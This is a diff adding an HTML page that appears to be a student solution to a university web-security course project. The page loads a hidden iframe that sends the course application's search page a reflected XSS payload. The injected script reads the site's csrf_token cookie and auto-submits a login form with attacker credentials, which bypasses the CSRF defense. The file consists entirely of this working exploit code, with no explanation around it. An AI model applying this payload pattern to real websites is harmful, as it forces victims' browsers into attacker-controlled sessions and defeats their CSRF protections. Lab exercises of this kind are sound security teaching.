@@ -1,0 +1,16 @@
+<html>
+<head>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+</head>
+<body>
+	<iframe style="display:none" id="frame" srcdoc=""></iframe>
+	<script>
+	$(document).ready(function(){
+		var csrf1Doc = `<script>` + `var address = "http://courses.cs.vt.edu/cs4264/project3/search?csrfdefense=1&xssdefense=0&q=";
+	   	var csrf1Injection = "<form action='http://courses.cs.vt.edu/cs4264/project3/login?csrfdefense=1&xssdefense=0' method='post' id='form'><input type='text' name='username' value='attacker'><input type='text' name='password' value='l33th4x'><input type='hidden' id='token' name='csrf_token' value=''></form><script>var token = '';var token_id = 'csrf_token=';var cookieContents = document.cookie.split(';');for(var i = 0; i < cookieContents.length; i++) {var item = cookieContents[i];while(item.charAt(0)==' ') {item = item.substring(1);} if(item.indexOf(token_id) == 0) {token = item.substring(token_id.length,item.length);}}$('#token').val(token);$('#form').submit();</script" + ">";
+	   	window.location.href = "http://courses.cs.vt.edu/cs4264/project3/search?csrfdefense=1&xssdefense=0&q=" + encodeURIComponent(csrf1Injection);` + `</script` + `>`;
+	    $("#frame").attr("srcdoc", csrf1Doc);
+	});
+	</script>
+</body>
+</html>
